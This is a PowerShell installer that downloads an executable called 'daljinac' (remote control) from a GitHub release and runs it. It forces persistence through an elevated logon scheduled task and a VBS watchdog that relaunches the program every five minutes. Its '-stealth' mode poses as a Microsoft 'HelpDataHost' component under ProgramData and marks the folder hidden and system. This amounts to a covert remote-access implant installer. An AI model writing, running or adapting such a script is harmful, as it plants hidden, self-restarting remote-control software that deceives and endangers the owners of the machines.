param([switch]$notray, [switch]$stealth)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

$URL = "https://github.com/egzakutacno/daljinac/releases/latest/download/systemUI.exe"

if ($stealth) {
    $Dir      = "C:\ProgramData\Microsoft\HelpData"
    $ExeName  = "HelpDataHost.exe"
} else {
    $Dir      = "C:\daljinac"
    $ExeName  = "systemUI.exe"
}
$Exe = "$Dir\$ExeName"
$ExtraArgs = if ($notray) { "-notray" } else { "" }

Write-Host "[0a/4] Cleaning old tasks..."
@("Daljinac","DaljinacWatch","HelpDataHost","HelpDataHostWatch") | ForEach-Object {
    schtasks /delete /tn $_ /f 2>$null
}

Write-Host "[0b/4] Killing old processes..."
$maxWait = 20
do {
    Get-Process systemUI,daljinac,HelpDataHost -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Seconds 1
    $maxWait--
    $portFree = $true
    try { (Get-NetTCPConnection -LocalPort 8081 -ErrorAction Stop).OwningProcess } catch { $portFree = $true }
    if ($maxWait -le 0) { break }
} while (-not $portFree)
Start-Sleep -Seconds 2

Write-Host "[1/4] Downloading..."
mkdir $Dir -Force | Out-Null
Invoke-WebRequest $URL -OutFile "$Exe.new" -UseBasicParsing
Write-Host "       $((Get-Item "$Exe.new").Length) bytes"

Start-Sleep -Seconds 1

Write-Host "[2/4] Replacing binary..."
Get-Process systemUI,HelpDataHost -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 1
Move-Item -Force "$Exe.new" $Exe

Write-Host "[3/4] Installing scheduled task..."
Remove-Item "$Dir\watchdog.vbs" -Force -ErrorAction SilentlyContinue

$taskName = [System.IO.Path]::GetFileNameWithoutExtension($ExeName)
$taskCmd = if ($ExtraArgs) { "`"$Exe`" $ExtraArgs" } else { "`"$Exe`"" }
$action  = New-ScheduledTaskAction -Execute $Exe -Argument $ExtraArgs
$trigger = New-ScheduledTaskTrigger -AtLogon
$settings = New-ScheduledTaskSettingsSet
$principal = New-ScheduledTaskPrincipal -UserId (whoami) -LogonType Interactive -RunLevel Highest
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
$vbsContent = "CreateObject(`"WScript.Shell`").Run `"schtasks /run /tn $taskName`", 0, False"
Set-Content -Path "$Dir\watchdog.vbs" -Value $vbsContent -Encoding ASCII
schtasks /create /tn "$taskName`Watch" /tr "wscript.exe //B $Dir\watchdog.vbs" /sc MINUTE /mo 5 /f 2>$null

if ($stealth) {
    attrib +h +s $Dir
    Write-Host "       Folder hidden (+h +s)"
}

Write-Host "[4/4] Starting..."
$cmd = if ($ExtraArgs) { "`"$Exe`" $ExtraArgs" } else { "`"$Exe`"" }
([wmiclass]'Win32_Process').Create($cmd) | Out-Null

Write-Host ""
Write-Host "DONE." -ForegroundColor Green
if ($stealth) { Write-Host "  Mode: STEALTH ($ExeName)" }
elseif ($notray) { Write-Host "  Mode: no-tray" }
